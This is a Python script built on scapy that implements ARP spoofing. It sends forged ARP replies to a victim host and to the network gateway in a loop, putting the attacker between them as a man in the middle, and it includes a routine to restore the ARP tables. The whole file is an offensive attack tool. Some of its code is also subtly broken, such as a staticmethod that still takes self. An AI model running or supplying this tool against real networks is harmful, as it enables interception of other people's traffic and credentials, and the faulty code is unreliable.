import scapy.all as scapy
import time
import sys
import os
from threading import Thread


class Spoofer:
    # targetIP: is Ip address of victim machine(10.0.2.4)
    # destinationMac: is Mac address of victim machine
    # spoofIP: is gatewayIP
    # op=2: represents the ARP packet is a response packet

    def __init__(self, destination_mac, source_mac, gateway_ip, target_ip):
        self.destinationMac = destination_mac
        self.sourceMAC = source_mac
        self.gatewayIP = gateway_ip
        self.targetIP = target_ip
        self.thread_running = True

    # destinationMac = '14-10-9F-E1-65-61' MAYBE DONT NEED DESTINATION MAC
    # sourceMAC = '0C-9D-92-82-9F-26'
    @staticmethod
    def get_mac(self, ip):
        ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def spoofer(self, targetIP, spoofIP):
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=self.destinationMac, psrc=spoofIP)
        scapy.send(packet, verbose=False)

    def restore(self, destinationIP, sourceIP):
        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=self.get_mac(destinationIP), psrc=sourceIP, hwsrc=self.sourceMAC)
        scapy.send(packet, count=4, verbose=False)

    def spoof(self):

        packets = 0

        try:
            while self.thread_running:
                self.spoofer(self.targetIP, self.gatewayIP)
                self.spoofer(self.gatewayIP, self.targetIP)
                print("\r[+] Sent packets " + str(packets)),
                sys.stdout.flush()
                packets += 2
                time.sleep(2)

        except KeyboardInterrupt:
            print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
            self.restore(self.targetIP, self.gatewayIP)
            self.restore(self.gatewayIP, self.targetIP)

    def stop_spoof(self):
        stop_signal = input('stop? : ')

    def main(self):
        t1 = Thread(target=self.spoof)
        t2 = Thread(target=self.stop_spoof)

        t1.start()
        t2.start()

        t2.join()  # interpreter will wait until your process get completed or terminated
        self.thread_running = False



